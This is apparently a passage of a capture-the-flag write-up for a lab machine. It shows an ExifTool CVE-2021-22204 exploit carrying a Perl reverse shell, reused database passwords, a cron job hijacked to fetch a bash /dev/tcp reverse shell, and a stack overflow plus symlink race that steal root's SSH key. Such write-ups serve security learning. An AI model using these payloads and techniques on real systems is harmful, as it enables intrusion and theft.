Before pivoting to that site, I’ll poke a bit more at this tag. Clicking the edit image loads the editor:

![image-20210929163823612](https://0xdfimages.gitlab.io/img/image-20210929163823612.png)

It looks a lot like PHP code, but no matter how I update it, nothing happens. When I click “Run”, it says it was updated, but the results are still the same. Not much I can do here.

### devbuild-job.overflow.htb

Visiting this new site offers a login form:

[![image-20210928144926612](https://0xdfimages.gitlab.io/img/image-20210928144926612.png)](https://0xdfimages.gitlab.io/img/image-20210928144926612.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210928144926612.png)

The same password for editor (“alpha!@#$%bravo”) work to get in:

[![image-20210928145122084](https://0xdfimages.gitlab.io/img/image-20210928145122084.png)](https://0xdfimages.gitlab.io/img/image-20210928145122084.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210928145122084.png)

There’s a ton going on, but most of the buttons/links don’t actually do anything.

On the profile page, there’s a link to upload a resume:

![image-20210928145329124](https://0xdfimages.gitlab.io/img/image-20210928145329124.png)

Clicking that button works, and allows me to select a file. The text at the bottom says it accepts `.tiff`, `.jpeg`, and `.jpg` format.

On uploading an image, it seems to just load the same page with no indication of success or failure. I went to Burp to see if it even submitted. The response was a 302 back to the same page, but there was also some output in it:

[![image-20210928145547953](https://0xdfimages.gitlab.io/img/image-20210928145547953.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210928145547953.png)

It’s very clearly running `exiftool` (version 11.92) on the image.

### CVE-2021-22204

There’s a really [neat writeup](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/) on CVE-2021-22204, an RCE vulnerability in `exiftool`. The issue is in how Exiftool tries to parse the DjVu filetype, and how that can be inserted into an image like a JPG.

There’s a Perl POC in the post, but I went with [this Python version](https://github.com/convisoappsec/CVE-2021-22204-exiftool). It needs `apt install djvulibre-bin exiftool`.

The script is really simple:

```

#!/bin/env python3    
    
import base64    
import subprocess    
    
ip = '127.0.0.1'    
port = '9090'    
    
payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"    

payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )        
    
payload = payload + b"'))};\")"    

payload_file = open('payload', 'w')    
payload_file.write(payload.decode('utf-8'))    
payload_file.close()    

subprocess.run(['bzz', 'payload', 'payload.bzz'])    
subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])    
subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg'])

```

It builds a payload that looks like a Perl reverse shell, and then uses `bzz`, `djvumake`, and `exiftool` to add it to the image, `image.jpg`. I’ll update the ip and port to 10.10.14.6 and 443 and run it:

```

oxdf@hacky$ python exploit.py 
    1 image files updated

```

I’ll start `nc` and upload that image to the site, and a shell connects back:

```

oxdf@hacky$ nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.119.
Ncat: Connection from 10.10.11.119:51622.
/bin/sh: 0: can't access tty; job control turned off
$ 

```

I’ll upgrade my shell using `script`:

```

$ script /dev/null -c bash
Script started, file is /dev/null
www-data@overflow:~/devbuild-job/home/profile$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@overflow:~/devbuild-job/home/profile$

```

## Shell as developer

### Enumeration

#### Homedirs

There are two users with home directories on the box:

```

www-data@overflow:/home$ ls
developer  tester

```

There’s not much in either, but `user.txt` is in `tester` and www-data cannot read it:

```

www-data@overflow:/home$ find . -type f -ls
   148204      4 -rw-r-----   1 root     tester         33 May 31 18:19 ./tester/user.txt
find: './tester/.cache/motd.legal-displayed': Permission denied
find: './tester/.ssh': Permission denied
   145046      4 -rw-r--r--   1 root     root         3151 May 30 19:15 ./tester/.bashrc
   150156      4 -rwxrwxr--   1 tester   tester        822 May 30 19:16 ./tester/.profile
find: './tester/.gnupg/private-keys-v1.d': Permission denied
find: './developer/.cache': Permission denied
find: './developer/.ssh': Permission denied
   151039      4 -rw-r--r--   1 developer root         3106 May 28 08:21 ./developer/.bashrc
   149153      4 -rw-r--r--   1 root      root           15 May 30 19:16 ./developer/.profile
find: './developer/.gnupg': Permission denied

```

#### DBs

A common place to look for creds is in the connections to the DB in the web files. `/var/www/html/config/db.php` has connection info for the Overflow site as developer:

```

<?php 

#define('DB_Server', 'localhost');
#define('DB_Username', 'root');
#define('DB_Password','root');
#define('DB_Name', 'Overflow');

$lnk = mysqli_connect("localhost","developer", "sh@tim@n","Overflow");
$db = mysqli_select_db($lnk,"Overflow");

if($db == false){
    dir('Cannot Connect to Database');
}

?>

```

The same creds are again in `/var/www/devbuild-job/config/db.php`:

```

<?php
$lnk = mysqli_connect("localhost","developer", "sh@tim@n","develop");
?>

```

And the same creds again in `/var/www/html/admin_cms_panel/config.php`:

```

<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'developer';
$config['db_password'] = 'sh@tim@n';
$config['db_name'] = 'cmsmsdb';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'America/Argentina/Tucuman';
?>

```

### su/ssh

That password, “sh@tim@n”, works for the developer user on the box:

```

www-data@overflow:~$ su - developer
Password: 
-su: 28: set: Illegal option -o history
-su: 1: set: Illegal option -o history
$ id
uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network)
$ bash
developer@overflow:~$ 

```

The creds work for SSH as well:

```

oxdf@hacky$ sshpass -p 'sh@tim@n' ssh developer@10.10.11.119
...[snip]...
$

```

## Shell as tester

### Enumeration

#### /opt

There is nothing of interest in `/home/developer`.

`/opt` has interesting stuff:

```

developer@overflow:/opt$ ls -l
total 8
-rwxr-x---+ 1 tester tester  109 May 28 08:47 commontask.sh
drwxr-x---+ 2 root   root   4096 Sep 17 21:56 file_encrypt

```

With the standard attributes, I shouldn’t have access, but the `+` means it’s using [extended file attributes](https://www.techrepublic.com/blog/linux-and-open-source/learn-to-use-extended-file-attributes-in-linux-to-boost-security/). `getfacl` shows that developer can read and execute `commontask.sh`:

```

developer@overflow:/opt$ getfacl commontask.sh 
# file: commontask.sh
# owner: tester
# group: tester
user::rwx
user:developer:r-x
group::---
mask::r-x
other::---

```

And tester can read/execute in `file_encrypt`:

```

developer@overflow:/opt$ getfacl file_encrypt/
# file: file_encrypt/
# owner: root
# group: root
user::rwx
user:tester:r-x
group::---
mask::r-x
other::---

```

`commontask.sh` is using `curl` to hit another vhost and pipes the results into `bash`:

```

#!/bin/bash

#make sure its running every minute.

bash < <(curl -s http://taskmanage.overflow.htb/task.sh)

```

There’s also a note that it runs every minute.

#### Identify hosts

My first thought was to look for this new vhost in `/etc/apache2/sites-enabled`, but it wasn’t there:

```

developer@overflow:/etc/apache2/sites-enabled$ grep taskmanage *

```

There’s also no other servers that could be hosting it on another port:

```

developer@overflow:~$ ss -ntlp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         100                 0.0.0.0:25               0.0.0.0:*       
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128                       *:80                     *:*       
LISTEN   0         128                    [::]:22                  [::]:*       
LISTEN   0         100                    [::]:25                  [::]:*  

```

I did note that developer is part of the network group:

```

developer@overflow:~$ id       
uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network)

```

`/etc/hosts` is in the network group:

```

developer@overflow:~$ find / -group network -ls 2>/dev/null
   262150      4 -rwxrw-r--   1 root     network       201 Sep 30 06:00 /etc/hosts

```

### RCE

I’ll set my IP to taskmanage.overflow.htb in `/etc/hosts`:

```

developer@overflow:~$ echo -e "10.10.14.6\ttaskmanage.overflow.htb"
10.10.14.6      taskmanage.overflow.htb
developer@overflow:~$ echo -e "10.10.14.6\ttaskmanage.overflow.htb" >> /etc/hosts

```

I’ll create a simple reverse shell as `task.sh`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

And I’ll start a Python web server in the directory with `task.sh`. When the minute rolls over, there’s a hit on the server:

```

oxdf@hacky$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.119 - - [28/Sep/2021 16:08:02] "GET /task.sh HTTP/1.1" 200 -

```

And then a reverse shell as tester:

```

oxdf@hacky$ nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.119.
Ncat: Connection from 10.10.11.119:51820.
bash: cannot set terminal process group (15402): Inappropriate ioctl for device
bash: no job control in this shell
tester@overflow:~$ 

```

I’ll upgrade my shell:

```

tester@overflow:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tester@overflow:~$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
tester@overflow:~$ 

```

And grab `user.txt`:

```

tester@overflow:~$ cat user.txt
c7cbbf3d************************

```

## Shell as root

### Enumeration

The first place to look is the `file_encrypt` directory that I know tester can access. It has two files:

```

tester@overflow:/opt/file_encrypt$ ls
file_encrypt  README.md

```

`file_encrypt` is a 32-bit executable:

```

tester@overflow:/opt/file_encrypt$ file file_encrypt 
file_encrypt: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3ae0f5750a8f1ac38945f813b5e34ddc166daf57, not stripped

```

The `README.md` :

```

Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application and report any issue that you get as this application is still in development. We have modified the tool a little bit that you can only use the pin feature now. The encrypt function is there but you can't use it now.The PIN should be in your inbox

```

If I run it, it asks for a pin:

```

tester@overflow:/opt/file_encrypt$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: 

```

I’ll pull a copy of this back to my VM for analysis.

### RE

#### General

I’ll open this in Ghidra and take a look. The `main` function is quite simple:

```

int main(void)

{
  check_pin();
  return 0;
}

```

`check_pin` is not that much longer:

```

void check_pin(void)

{
  undefined user_name [20];
  int user_pin;
  long pin;
  int code;
  
  code = rand();
  pin = random(code);
  printf("This is the code %i. Enter the Pin: ",code);
  __isoc99_scanf("%i",&user_pin);
  if (pin == user_pin) {
    printf("name: ");
    __isoc99_scanf("%s",user_name);
    puts(
        "Thanks for checking. You can give your feedback for improvements at developer@overflow.htb"
        );
  }
  else {
    puts("Wrong Pin");
  }
  return;
}

```

It generates a random `code` and then a `pin`. It prints `code` and asks for the `pin`, which it reads with `scanf`. If the user input matches `pin`, it reads a `name` with `scanf`.

#### Issue with rand

`rand` is the random function from the C library. To use it correctly, you have to call `srand` first to seed the pseudo-random number generator. It’s common to use the time to do this. The [man page](https://linux.die.net/man/3/rand) says what will happen if `rand` is not seeded:

> The **srand**() function sets its argument as the seed for a new sequence of pseudo-random integers to be returned by **rand**(). These sequences are repeatable by calling **srand**() with the same seed value.
>
> If no seed value is provided, the **rand**() function is automatically seeded with a value of 1.

That means the result will be the same each time. Running it a few times confirms this:

```

oxdf@hacky$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: ^C
oxdf@hacky$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: ^C
oxdf@hacky$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: ^C

```

#### Pin

To find out if I can match the pin, I’ll look at `random`:

```

long random(int code)

{
  uint result;
  int i;
  
  result = 0x6b8b4567;
  for (i = 0; i < 10; i = i + 1) {
    result = result * 0x59 + 0x14;
  }
  return result ^ code;
}

```

It’s not random at all. I can calculate that in Python:

```

>>> x = 0x6b8b4567
>>> for i in range(10):
...     x = ((x * 0x59) + 0x14) % pow(2,32)
... 
>>> x ^ 1804289383
4091990840

```

This doesn’t work:

```

oxdf@hacky$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: 4091990840
Wrong Pin

```

The trick is that `scanf` is reading into `%i`, a [signed integer](https://www.cplusplus.com/reference/cstdio/scanf/). That’s 32 bits, and this result is actually negative in 32 bits, because the top bit is 1:

```

>>> hex(x ^ 1804289383)
'0xf3e6d338'
>>> (x ^ 1804289383) >> 31
1

```

I can see that above by shifting 31 bits to the right, or looking at the hex and seeing the first character is `f`, which is `1111`. To display it as a negative number, I’ll just subtract 232:

```

>>> res - pow(2,32)
-202976456

```

That works as a pin, and now it’s asking for a name:

```

oxdf@hacky$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name:

```

#### Overflow

The `name` prompt is overflowable. `scanf` with `%s` reads through the newline character, but the buffer being read into is only 20 bytes long. The reason this one is dangerous while the previous `scanf` was not is that the previous `scanf` was reading an int, `%i`, so it produced a four byte result regardless, leaving no chance to overflow.

I can check this by passing in a long name:

```

oxdf@hacky$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
Segmentation fault

```

#### encrypt

There is an `encrypt` function in the code as well (referenced in the note). After renaming/retyping many of the variables in Ghidra, it looks like:

```

void encrypt(void)

{
  int res;
  int *error_addr;
  char *error_msg;
  FILE *fd_input;
  FILE *fd_output;
  uint byte;
  char user_outfile [20];
  char user_infile [20];
  stat stat_struct;
  
  user_infile._0_4_ = 0;
  user_infile._4_4_ = 0;
  user_infile._8_4_ = 0;
  user_infile._12_4_ = 0;
  user_infile._16_4_ = 0;
  user_outfile._0_4_ = 0;
  user_outfile._4_4_ = 0;
  user_outfile._8_4_ = 0;
  user_outfile._12_4_ = 0;
  user_outfile._16_4_ = 0;
  printf("Enter Input File: ");
  __isoc99_scanf("%s",user_infile);
  printf("Enter Encrypted File: ");
  __isoc99_scanf("%s",user_outfile);
  res = stat(user_infile,&stat_struct);
  if (res < 0) {
    error_addr = __errno_location();
    error_msg = strerror(*error_addr);
    fprintf(stderr,"Failed to stat %s: %s\n",user_infile,error_msg);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (stat_struct.st_uid == 0) {
    fprintf(stderr,"File %s is owned by root\n",user_infile);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sleep(3);
  fd_input = fopen(user_infile,"rb");
  if (fd_input == (FILE *)0x0) {
    error_addr = __errno_location();
    error_msg = strerror(*error_addr);
    fprintf((FILE *)"cannot open input file %s: %s\n",user_infile,error_msg);
  }
  else {
    fd_output = fopen(user_outfile,"wb");
    if (fd_output == (FILE *)0x0) {
      error_addr = __errno_location();
      error_msg = strerror(*error_addr);
      fprintf((FILE *)"cannot open output file %s: %s\n",user_outfile,error_msg);
      fclose(fd_input);
    }
    else {
      while( true ) {
        byte = _IO_getc((_IO_FILE *)fd_input);
        if (byte == 0xffffffff) break;
        _IO_putc(byte ^ 0x9b,(_IO_FILE *)fd_output);
      }
      fclose(fd_input);
      fclose(fd_output);
    }
  }
  return;
}

```

This is also dead simple. It:
- prompts for input and output file names;
- gets metadata on the file;
- if the file is owned by root, print error and exit;
- otherwise read input file one byte at a time, XOR with 0x9b, and write it to the output.

It’s worth noting that the two file names are read into 20-byte buffers on the stack, ordered like:

![image-20210930083358132](https://0xdfimages.gitlab.io/img/image-20210930083358132.png)

`user_infile` is readinfile is read, and then `user_outfile`. If `user_outfile` is longer than 20 characters (including a terminating null), it will overwrite into the start of `user_infile`. Then `stat` is called on `user_infile`. The result would overwrite the end of `user_infile` if it is longer than 20 bytes. There are some tricks I could play here, but if I want to use the legit functionality, I need to keep both paths under 20 bytes.

### Return to Encrypt

#### EIP Offset

I need to know how far into the `name` buffer is the return address. I can use `pattern_create` from within [Peda](https://github.com/longld/peda) in `gdb`, and give that as my name:

```

gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /media/sf_CTFs/hackthebox/overflow-10.10.11.119/file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb

```

Then it crashes at a seg fault:

```

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x5b ('[')
EBX: 0x61414145 ('EAAa')
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fa7000 --> 0x1e4d6c 
EDI: 0xf7fa7000 --> 0x1e4d6c 
EBP: 0x41304141 ('AA0A')
ESP: 0xffffceb0 --> 0xf7004162 
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffceb0 --> 0xf7004162 
0004| 0xffffceb4 --> 0xffffced0 --> 0x1 
0008| 0xffffceb8 --> 0x0 
0012| 0xffffcebc --> 0xf7de0e46 (<__libc_start_main+262>:       add    esp,0x10)
0016| 0xffffcec0 --> 0xf7fa7000 --> 0x1e4d6c 
0020| 0xffffcec4 --> 0xf7fa7000 --> 0x1e4d6c 
0024| 0xffffcec8 --> 0x0 
0028| 0xffffcecc --> 0xf7de0e46 (<__libc_start_main+262>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()

```

In a 32-bit program, the address is returned into EIP before the crash, so I can feed it that value, “AFAA” to see the offset is 44 bytes into the name:

```

gdb-peda$ pattern_offset AFAA
AFAA found at offset: 44

```

#### Address of encrypt

If I’m going to return to `encrypt`, I need the address. Interestingly, `checksec` says that PIE is enabled:

```

oxdf@hacky$ checksec file_encrypt
[*] '~/hackthebox/overflow-10.10.11.119/file_encrypt'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

Luckily for me, ASLR is disabled on the server, so the code will be fixed in memory. `gdb` on Overflow shows the address:

```

tester@overflow:/opt/file_encrypt$ gdb -q file_encrypt
Reading symbols from file_encrypt...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0xb70
(gdb) r
Starting program: /opt/file_encrypt/file_encrypt 

Breakpoint 1, 0x56555b70 in main ()
(gdb) p encrypt 
$1 = {<text variable, no debug info>} 0x5655585b <encrypt>

```

#### Encrypt Non-Root File

At this point I have what I need to encrypt a non-root file. Because I’m lucky, the address of `encrypt` is all ASCII character, I can just type in the exploit:

```

tester@overflow:/opt/file_encrypt$ echo "Hello world" > /tmp/0xdf
tester@overflow:/opt/file_encrypt$ python3 -c 'print("A"*44 + "\x5b\x58\x55\x56")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
tester@overflow:/opt/file_encrypt$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
Enter Input File: /tmp/0xdf
Enter Encrypted File: /tmp/0xdf-enc
Segmentation fault (core dumped)

```

It core dumps because it doesn’t have anything to return to coming out of `encrypt`. Still, `/tmp/0xdf-enc` is there owned by root:

```

tester@overflow:/opt/file_encrypt$ ls -l /tmp/0xdf-enc 
-rw-rw-r-- 1 root tester 12 Sep 30 06:25 /tmp/0xdf-enc

```

Better yet, if I XOR each byte by 0x9b, I get the original message:

```

tester@overflow:/opt/file_encrypt$ python3
Python 3.6.9 (default, Jan 26 2021, 15:33:00) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> with open('/tmp/0xdf-enc', 'rb') as f:
...     enc = f.read()
... 
>>> enc
b'\xd3\xfe\xf7\xf7\xf4\xbb\xec\xf4\xe9\xf7\xff\x91'
>>> print(''.join([chr(c^0x9b) for c in enc]))
Hello world

```

I’ll write a quick helper script that prints the output needed to run the exploit:

```

#!/usr/bin/env python3

import sys

print("-202976456")
print("A"*44 + "\x5b\x58\x55\x56")
print(sys.argv[1])
print(sys.argv[2])

```

This will just print the pin, newline, the overflow to return to `encrypt`, newline, the input file, newline, and output file, newline. I can run that to generate the input needed to encrypt a file:

```

tester@overflow:/opt/file_encrypt$ python3 /tmp/sploit.py /tmp/0xdf /tmp/out | ./file_encrypt 
This is the code 1804289383. Enter the Pin: name: Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
Segmentation fault (core dumped)
tester@overflow:/opt/file_encrypt$ xxd /tmp/out 
00000000: d3fe f7f7 f4bb ecf4 e9f7 ff91            ............

```

In this case I’m doing in one line what I did above, encrypting my file with “Hello world”, and getting the same output.

### Get root Files

#### root.txt

There’s still the check preventing reading of files owned by root:

```

tester@overflow:/opt/file_encrypt$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
Enter Input File: /root/root.txt
Enter Encrypted File: /tmp/root.txt
File /root/root.txt is owned by root

```

To get around this, I’ll take advantage of a time of check/time of use vulnerability here:

```

  if (stat_struct.st_uid == 0) {
    fprintf(stderr,"File %s is owned by root\n",user_infile);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sleep(3);
  fd_input = fopen(user_infile,"rb");

```

There are three seconds between when the ownership of the file is checked and when the file is opened. To make this exploit reliable, I’ll add my ssh key to tester’s `authorized_keys` file and get three ssh sessions.

I’ll work out of `/tmp/0xdf`. There are some protections in place that make working out of just `/tmp` actually fail.

In the first window, I’ll run the following infinite loop:

```

while :; do 
    rm l; 
    ln -sf /root/root.txt l; 
    sleep 3; 
    rm l; 
    echo "oops" > l; 
    sleep 3; 
done

```

This will swap a file, `l`, between a symlink to `root.txt` and a file with the string “oops” in it every three seconds.

In the next window, I’ll start a watch:

```

tester@overflow:/tmp/0xdf$ watch -d -n 1 'ls -l o l'

```

This will run `ls -l o l` every second and give the results. This allows me to see what `l` is currently.

![image-20210930095520033](https://0xdfimages.gitlab.io/img/image-20210930095520033.png)

In the third window, I’ll prep my exploit to encrypt `l`:

```

tester@overflow:/opt/file_encrypt$ python3 /tmp/sploit.py /tmp/0xdf/l /tmp/0xdf/o | ./file_encrypt

```

I’ll want to wait to run this until I see that `l` contains “oops”. Once it switches there, I’ll immediately hit enter. It will `stat` on `l` and see a normal file not owned by root. Then it sleeps three seconds. While that sleep is happening, the three second sleep in the while loop will end, and replace `l` with a symlink. When when the sleep in `file_encrypt` ends, it will read via the symlink `root.txt` and encrypt it.

[This video](https://www.youtube.com/watch?v=ZroW5AHGK6Q) gives a quick demonstration of how all this works:

The resulting file is 33 bytes, the flag xored by 0x9b:

```

tester@overflow:/tmp/0xdf$ ls -l o 
-rw-rw-r-- 1 root tester 33 Sep 30 19:28 o
tester@overflow:/tmp/0xdf$ xxd o
00000000: aaa2 adaa fafe acaf a2ff a3ae a8ad afa8  ................
00000010: fdfd f9aa aba2 a8fa feab aaa8 abaf a8a3  ................
00000020: 91                                       .

```

I can decrypt it in Python:

```

>>> with open('/tmp/0xdf/o', 'rb') as f:
...     enc = f.read()
... 
>>> print(''.join([chr(0x9b^x) for x in enc]))
1961ae74************************

```

#### Shell

I can use the same technique to read `/root/.ssh/id_rsa` by changing the loop:

```

while :; do rm l; ln -sf /root/.ssh/id_rsa l; sleep 3; rm l; echo "oops" > l; sleep 3; done

```

Once I decrypt the output, I can SSH into the box as root:

```

oxdf@hacky$ ssh -i ~/keys/overflow-root root@10.10.11.119
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-143-generic x86_64)
...[snip]...
root@overflow:~# 

```